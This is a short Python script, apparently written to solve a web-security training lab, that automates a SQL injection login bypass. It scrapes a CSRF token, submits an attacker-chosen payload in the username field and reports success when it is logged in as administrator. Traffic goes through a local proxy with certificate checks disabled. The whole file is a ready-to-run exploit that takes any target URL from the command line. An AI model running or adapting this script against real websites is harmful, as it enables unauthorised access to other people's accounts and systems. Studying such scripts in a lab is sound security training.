import sys
import requests
from bs4 import BeautifulSoup
import urllib3

proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def create_csrf_token(session: requests.Session, url: str) -> str:
    """
    Create csrf token
    :param session: requests.Session()
    :param url: url
    :return: csrf token
    """
    request_to_get_csrf_token = session.get(url, verify=False, proxies=proxy)
    soup = BeautifulSoup(request_to_get_csrf_token.text, "html.parser")
    csrf_token = soup.find("input")["value"]
    return csrf_token


def exploit_sql_injection(session: requests.Session, url: str, payload: str) -> bool:
    """
    Exploit sql injection
    :param session: requests.Session()
    :param url: url
    :param payload: payload
    :return: True or False
    """
    csrf_token = create_csrf_token(session, url)
    data = {"csrf": csrf_token, "username": payload, "password": "randomtext"}
    request_to_check_exploit = session.post(url, data=data, verify=False, proxies=proxy)
    result = request_to_check_exploit.text
    if "Log out" in result:
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sql_injection_payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)
    exploit_session = requests.Session()
    if exploit_sql_injection(exploit_session, url, sql_injection_payload):
        print("[+] SQL injections successful. I log in as administrator")
    else:
        print("[-] SQL injections unsuccessful")
